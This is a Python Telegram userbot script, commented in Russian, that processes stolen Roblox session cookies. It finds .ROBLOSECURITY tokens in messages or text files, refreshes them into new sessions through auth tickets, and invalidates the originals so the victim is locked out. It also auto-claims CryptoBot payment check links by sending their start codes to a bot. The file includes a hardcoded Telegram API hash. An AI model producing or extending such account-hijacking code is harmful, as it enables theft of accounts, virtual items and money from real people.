import logging
from telethon import TelegramClient, events
from telethon.tl.types import DocumentAttributeFilename
from telethon.types import KeyboardButtonUrl
from datetime import datetime
import re
import fresher
import os

class CustomLogger:
    def __init__(self, name, log_file='app.log'):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(logging.INFO)
        
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        
        file_handler = logging.FileHandler(
            log_file,
            encoding='utf-8'
        )
        file_handler.setFormatter(formatter)
        
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)

class TelegramBot:
    def __init__(self):
        self.logger = CustomLogger('TelegramBotLogging').logger
        self.client = self.create_client()
        
    def create_client(self):
        try:
            self.logger.info("Создание Telegram клиента...")
            return TelegramClient(
                'session',
                api_id=29869965,
                api_hash='4f22845e9afe3a4e933bd7189e445740',
                device_model="Q4I31G7ZX-ELITE",
                system_version="Windows 10",
                app_version="5.10.7 x64",
                base_logger=self.logger
            )
        except Exception as e:
            self.logger.error(f"Ошибка при создании клиента: {str(e)}")
            raise
    
    async def start(self):
        try:
            await self.client.start()
            self.logger.info("Клиент Telegram успешно запущен")
            await self.start_message()
            await self.register_handlers()
            await self.client.run_until_disconnected()
        except Exception as e:
            self.logger.error(f"Ошибка в работе бота: {str(e)}")
            raise
    
    async def start_message(self):
        try:
            await self.client.send_message("me", "Started...")
            self.logger.info("Стартовое сообщение отправлено")
        except Exception as e:
            self.logger.error(f"Ошибка при отправке стартового сообщения: {str(e)}")
    
    async def register_handlers(self):
        self.client.add_event_handler(
            self.message_handler,
            events.NewMessage("me")
        )
        self.client.add_event_handler(
            self.message_handler,
            events.MessageEdited("me")
        )
        self.logger.info("Обработчики сообщений зарегистрированы")
    
    async def message_handler(self, event):
        try:
            message = event.message
            self.logger.info(f"Сообщение: {message.text}")

            if message.reply_markup:
                await self.handle_crypto_bot(message)

            if "_|WARNING" in message.text:
                await self.handle_cookie_text(message)

            if message.media and hasattr(message.media, 'document'):
                await self.handle_cookie_file(message)
        except Exception as e:
            self.logger.error(f"Ошибка в обработчике сообщений: {str(e)}")
    
    @staticmethod
    async def extract_cookies(text):
        pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Za-z0-9+/=]+'
        return re.findall(pattern, text)
    
    async def refresh_cookie(self, cookie):
        try:
            self.logger.info("Попытка обновления куки...")
            auth_ticket = await fresher.generate_auth_ticket(cookie)

            if auth_ticket == "Failed to fetch auth ticket":
                await self.send_invalid_cookie_message()
                self.logger.error("Не удалось сгенерировать auth_ticket")
                return
            
            self.logger.info("Auth ticket успешно получен")
            
            fresh_result = await fresher.redeem_auth_ticket(auth_ticket)
            kill_result = await fresher.kill_cookie(cookie, auth_ticket["Csrf_token"])

            if not fresh_result["success"]:
                await self.handle_fresh_failure(fresh_result)
                self.logger.error("Не удалось обновить куки")
                return
            
            if fresh_result["refreshed_cookie"]:
                await self.save_and_send_cookie(fresh_result["refreshed_cookie"])
                self.logger.info("Куки успешно обновлены и сохранены")

            if kill_result == "Old cookie successfully killed":
                await self.send_kill_success_message()
                self.logger.info("Старые куки успешно деактивированы")
        except Exception as e:
            self.logger.error(f"Ошибка при обновлении куки: {str(e)}")
    
    async def send_invalid_cookie_message(self):
        try:
            await self.client.send_message(
                "me",
                f"Invalid cookie. Time {datetime.now().replace(microsecond=0)}"
            )
            self.logger.warning("Отправлено сообщение о невалидной куке")
        except Exception as e:
            self.logger.error(f"Ошибка при отправке сообщения: {str(e)}")
    
    async def handle_fresh_failure(self, fresh_result):
        try:
            if fresh_result.get("roblox_debug_response") and fresh_result["roblox_debug_response"] == 401:
                message = f"Unauthorized: The provided cookie is invalid. Time {datetime.now().replace(microsecond=0)}"
            else:
                message = f"Invalid cookie. Time {datetime.now().replace(microsecond=0)}"
            
            await self.client.send_message("me", message)
            self.logger.warning("Отправлено сообщение об ошибке обновления куки")
        except Exception as e:
            self.logger.error(f"Ошибка при обработке неудачного обновления: {str(e)}")
    
    async def save_and_send_cookie(self, cookie):
        try:
            blob = cookie.encode("utf-8")
            await self.client.send_file("me", blob)
            self.logger.info("Обновленные куки отправлены в файле")
        except Exception as e:
            self.logger.error(f"Ошибка при сохранении и отправке куки: {str(e)}")
    
    async def send_kill_success_message(self):
        try:
            await self.client.send_message(
                "me", 
                f"Старые куки успешно сломаны.. Время {datetime.now().replace(microsecond=0)} ✅"
            )
            self.logger.info("Отправлено сообщение об успешной деактивации старых кук")
        except Exception as e:
            self.logger.error(f"Ошибка при отправке сообщения: {str(e)}")
    
    async def handle_cookie_text(self, message):
        try:
            cookies = await self.extract_cookies(message.text)
            self.logger.info(f"Найдено {len(cookies)} кук в тексте")
            for cookie in cookies:
                print(cookie)
                await self.refresh_cookie(cookie)
        except Exception as e:
            self.logger.error(f"Ошибка при обработке текста с куками: {str(e)}")
    
    async def handle_cookie_file(self, message):
        try:
            for attr in message.media.document.attributes:
                if isinstance(attr, DocumentAttributeFilename):
                    file_name = attr.file_name
                    if file_name.endswith(".txt"):
                        blob = await self.client.download_media(message, bytes)
                        cookies = await self.extract_cookies(blob.decode("utf-8"))
                        self.logger.info(f"Найдено {len(cookies)} кук в файле")
                        for cookie in cookies:
                            await self.refresh_cookie(cookie)
        except Exception as e:
            self.logger.error(f"Ошибка при обработке файла с куками: {str(e)}")
    
    async def handle_crypto_bot(self, message):
        try:
            starters_lol = ["send?start=", "CryptoBot?start=", "calc?start="]
            for row in message.reply_markup.rows:
                for button in row.buttons:
                    if isinstance(button, KeyboardButtonUrl):
                        url = button.url
                        if any(starter in url for starter in starters_lol):
                            self.logger.info(f'Новая ссылка: {url}')
                            code = url.split("start=")[1]
                            await self.client.send_message(1559501630, f'/start {code}')
        except Exception as e:
            self.logger.error(f"Ошибка при обработке чека: {str(e)}")


if __name__ == "__main__":
    try:
        print(f"Текущая директория: {os.getcwd()}")
        print(f"Доступ на запись в app.log: {os.access('app.log', os.W_OK)}")
        
        bot = TelegramBot()
        bot.client.loop.run_until_complete(bot.start())
    except Exception as e:
        logging.getLogger('TelegramBot').error(f"Критическая ошибка: {str(e)}")
        raise
